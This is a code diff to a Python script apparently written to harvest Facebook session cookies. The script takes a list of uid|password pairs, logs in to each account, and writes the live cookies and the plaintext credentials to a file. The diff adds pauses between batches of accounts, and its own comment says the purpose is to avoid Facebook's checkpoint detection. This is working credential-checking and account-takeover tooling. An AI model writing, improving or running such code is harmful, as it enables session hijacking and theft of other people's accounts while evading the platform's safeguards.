@@ -28,29 +28,33 @@ class FacebookCookieExtractor:
                                                                                                                                              
  {c['g']}Coded By Berlin{c['w']}
  ⚠️  Script ini bersifat gratis dan tidak untuk diperjualbelikan.
- 📂  Source: https://github.com/berlianoel
+ 📂  Source: https://github.com/berlianoel/Cookiesid
  📛  Tolong tidak disalah gunakan!
 {"-" * self.get_term_size()}
 """)
 
-    def start(self, file_name, cookies_file):
+    def start(self, file_name):
         self.clear_screen()
         self.display_logo()
-
+        
         with open(file_name, "r") as f:
-            for line in f:
-                id, password = line.strip().split("|")
-
-                cookies = self.get_cookies(id, password)
-
+            accounts = [line.strip().split("|") for line in f.readlines()]
+        
+        for i, (uid, password) in enumerate(accounts):
+            cookies = self.get_cookies(uid, password)
+            if cookies is not None:
                 if "c_user" in cookies:
-                    print(f" [{self.colored('g', 'OK')}] {id} | {password}\n [{self.colors['g']}Cookies{self.colors['w']}] {cookies}")
-                    with open(cookies_file, "a") as f2:
-                        f2.write(f"{id}|{password}|{cookies}\n")
+                    print(f" [{self.colored('g', 'OK')}] {uid} | {password}\n [{self.colors['g']}Cookies{self.colors['w']}] {cookies}")
+                    with open("cookies.txt", "a") as f:
+                        f.write(f"{uid}|{password}|{cookies}\n")
                 elif "checkpoint" in cookies:
-                    print(f" [{self.colored('r', 'CP')}] {id} | {password}")
-
-                sleep(1)
+                    print(f" [{self.colored('r', 'CP')}] {uid} | {password}")
+            else:
+                print(f" [{self.colored('r', 'Error')}] Gagal mendapatkan cookies untuk akun {uid} | {password}")
+            
+            if (i + 1) % 5 == 0 and i < len(accounts) - 1:
+                print("Sleeping for 60 detik to avoid checkpoint...")
+                sleep(60)
 
     def get_cookies(self, uid, password):
         session = Session()
@@ -83,14 +87,16 @@ class FacebookCookieExtractor:
         }
         privacy_token = re.search(r'privacy_mutation_token=([^&amp;]+)', resp)
 
-        resp = session.post(f'https://www.facebook.com/login/?privacy_mutation_token={privacy_token}', data=data).text
-        return encode_cookies(session.cookies.get_dict())
+        try:
+            resp = session.post(f'https://www.facebook.com/login/?privacy_mutation_token={privacy_token}', data=data, timeout=5).text
+            return encode_cookies(session.cookies.get_dict())
+        except requests.exceptions.Timeout:
+            print("Timeout! Please try again later.")
+            return None
 
     def colored(self, color, text):
         return f"{self.colors[color]}{text}{self.colors['w']}"
 
 if __name__ == "__main__":
     cookie_extractor = FacebookCookieExtractor()
-    cookie_extractor.start("idpw.txt", "cookies.txt")
-   
-# Copyright By Berlin
+    cookie_extractor.start("idpw.txt")
